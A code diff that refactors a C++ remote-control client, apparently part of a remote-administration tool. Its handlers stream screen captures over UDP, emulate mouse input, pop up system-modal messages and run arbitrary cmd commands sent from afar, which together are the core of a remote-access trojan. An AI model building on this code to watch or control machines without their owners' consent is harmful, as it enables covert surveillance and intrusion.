@@ -9,7 +9,7 @@
 #include "..\Capturing\ScreenCapturer.hpp"
 #include "..\Service\Debugger.hpp"
 
-const std::array<CommandProperties, static_cast<size_t>(Commands::NUMBER_OF_COMMANDS)> COMMAND_PROPERTIES
+const std::array<CommandProperties, static_cast<std::size_t>(Commands::NUMBER_OF_COMMANDS)> COMMAND_PROPERTIES
 { {
 	{ std::make_tuple(Commands::MESSAGEBOX,        "message"), _onCmd_MESSAGEBOX        },
 	{ std::make_tuple(Commands::VIEWDESKTOP_START, "vdstart"), _onCmd_VIEWDESKTOP_START },
@@ -52,7 +52,7 @@ namespace detail
 
 	namespace emulator
 	{
-		inline static constexpr size_t DELAY = 100;
+		inline static constexpr std::size_t DELAY = 100;
 
 		bool SendMouseInput(DWORD button) noexcept
 		{
@@ -101,24 +101,28 @@ bool _onCmd_MESSAGEBOX(const args_t &args)
 	return (MessageBox(nullptr, args.at(0).c_str(), "MESSAGE", MB_ICONERROR | MB_OK | MB_SYSTEMMODAL) != 0);
 }
 
-void _onCmd_VIEWDESKTOP_START(const args_t&, cip_t &cip, size_t pos, boost::asio::io_context &io_context, const boost::asio::ip::udp::endpoint &endpoint) //-V2009
+void _onCmd_VIEWDESKTOP_START(const args_t&, cip_t &cip, std::size_t pos, boost::asio::io_context &io_context, const boost::asio::ip::udp::endpoint &endpoint) //-V2009
 {
-	UDPParticipiant server(io_context, endpoint);
-	ScreenCapturer scapt;
+#pragma warning(suppress : 26414)
+	// warning C26414: Move, copy, reassign or reset a local smart pointer 'server' (r.5).
+	std::unique_ptr<UDPParticipiant> server{ std::make_unique<UDPParticipiant>(io_context, endpoint) } ;
+	std::shared_ptr<ScreenCapturer>  scapt { ScreenCapturer::create<ScreenCapturer>() };
+	std::shared_ptr<IMPROTO>         imsg  { std::make_shared<IMPROTO>() };
 	while (cip[pos])
 	{	
-		scapt.capture();
+		imsg->clear_data();
 
-		IMPROTO msg;
-		msg.set_body_length(scapt.get_data_size());
-		std::memcpy(msg.get_body(), scapt.release_data(), msg.get_body_length());
+		scapt->capture();
 
-		server.send(&msg);
-		$INFO("Sent %llu bytes\n", msg.get_body_length())
+		imsg->set_data_length(scapt->get_data_size());
+		std::copy_n(scapt->get_data().get(), imsg->get_data_length(), std::begin(imsg->get_data()));
+
+		server->send(imsg);
+		$INFO("Sent %llu bytes\n", imsg->get_data_length())
 	}
 }
 
-void _onCmd_VIEWDESKTOP_STOP(const args_t&, cip_t &cip, size_t pos, boost::asio::io_context&, const boost::asio::ip::udp::endpoint&)
+void _onCmd_VIEWDESKTOP_STOP(const args_t&, cip_t &cip, std::size_t pos, boost::asio::io_context&, const boost::asio::ip::udp::endpoint&)
 {
 	cip[pos] = false; // TODO: mutex
 }
@@ -161,16 +165,26 @@ bool _onCmd_MOUSECTRL_OFF(const args_t&) noexcept
 bool _onCmd_EXECUTECMD(const args_t &args)
 {
 	std::string params;
-	for (auto &&arg : args)
-		params += arg;
+#pragma warning(push)
+#pragma warning(disable : 26486 26489)
+	// warning C26486: Don't pass a pointer that may be invalid to a function. Parameter 1 '{InvalidLoc}' in call to 'std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=' may be invalid (lifetime.1).
+	// warning C26489: Don't dereference a pointer that may be invalid: 'arg'. 'arg' may have been invalidated at line 169 (lifetime.1).
+	if(!args.empty())
+		for (const auto &arg : args)
+			params += arg;
 
-	SHELLEXECUTEINFO sei{ sizeof(SHELLEXECUTEINFO) };
+#pragma warning(suppress : 26476)
+	// warning C26476: Expression/symbol '{0}' uses a naked union 'union ' with multiple type pointers: Use variant instead (type.7).
+	SHELLEXECUTEINFO sei{ };
+	sei.cbSize = sizeof(SHELLEXECUTEINFO);
 	sei.fMask        = SEE_MASK_ASYNCOK | SEE_MASK_NO_CONSOLE;
 	sei.lpVerb       = TEXT("open");
 	sei.lpFile       = TEXT("cmd");  
 	sei.lpParameters = params.c_str();
 	sei.nShow        = SW_SHOW;
 
+#pragma warning(suppress : 26486)
+	// warning C26486: Don't pass a pointer that may be invalid to a function. Parameter 1 'sei.hIcon' in call to 'ShellExecuteExA' may be invalid (lifetime.1).
 	return ShellExecuteEx(&sei);
 }
 
